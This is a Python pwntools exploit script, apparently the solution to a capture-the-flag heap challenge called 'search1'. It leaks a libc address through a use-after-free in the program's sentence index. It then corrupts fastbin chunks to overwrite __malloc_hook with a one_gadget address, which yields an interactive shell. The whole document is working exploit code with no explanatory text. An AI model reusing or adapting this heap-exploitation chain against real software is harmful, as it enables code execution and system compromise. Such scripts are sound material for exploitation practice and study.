#! /usr/bin/env python3
from pwn import *

context(os='linux', arch='amd64', log_level='debug')
context.terminal = ['tmux','splitw','-h']
elf = ELF('./search1')
libc = ELF('libc.so.6')
# libc = elf.libc
p = process('./search1')

def search_word_ans(word,ans):
    p.recvuntil('3: Quit\n')
    p.sendline('1')
    p.recvuntil('size:\n')
    p.sendline(str(len(word)))
    p.recvuntil('word:\n')
    p.sendline(word)
    p.recvuntil('(y/n)?\n')
    p.sendline(ans)

def search_word(word):
    p.recvuntil('3: Quit\n')
    p.sendline('1')
    p.recvuntil('size:\n')
    p.sendline(str(len(word)))
    p.recvuntil('word:\n')
    p.sendline(word)

def index_sentence(sentence):
    p.recvuntil('3: Quit\n')
    p.sendline('2')
    p.recvuntil('size:\n')
    p.sendline(str(len(sentence)))
    p.recvuntil('sentence:\n')
    p.sendline(sentence)

def debug():
    gdb.attach(p)
    pause()

# index_sentence('123 aaa')
# index_sentence('456 bbb')
# leak_libc
index_sentence(0x80*'a'+' '+'123')
index_sentence(0x10*'1')
index_sentence(0x10*'2')

search_word_ans('1'*0x10,'y')

search_word_ans('123','y')

search_word('\x00'*0x3)

p.recvuntil('Found 132: ')


unsorted_addr = u64(p.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00'))
log.success('unsorted_addr: ' + hex(unsorted_addr))

libc.address = unsorted_addr - 0x3c4b78
log.success('libc.address: ' + hex(libc.address))

system_addr = libc.sym['system']
log.success('system_addr: ' + hex(system_addr))

p.recvuntil('(y/n)?\n')
p.sendline('n')

# malloc_hook
index_sentence(0x60*'b'+' '+'777')

index_sentence(0x60*'c'+' '+'1234')
index_sentence(0x60*'d'+' '+'456')


search_word_ans(0x60*'b','y')
search_word_ans(0x60*'c','y')
search_word_ans(0x60*'d','y')

index_sentence(0x60*'e'+' '+'888')


search_word_ans('\x00'*0x4,'y')



__malloc_hook_s23h = libc.address + 0x3c4aed
index_sentence(p64(__malloc_hook_s23h).ljust(0x60,b'a')+b' '+b'888')


index_sentence(0x60*'e'+' '+'888')
index_sentence(0x60*'e'+' '+'888')

one_addr = libc.address + 0xf1147
payload = b'a'*0x13 + p64(one_addr)
payload = payload.ljust(0x60,b'a')

index_sentence(payload+b' '+b'888')

p.interactive()
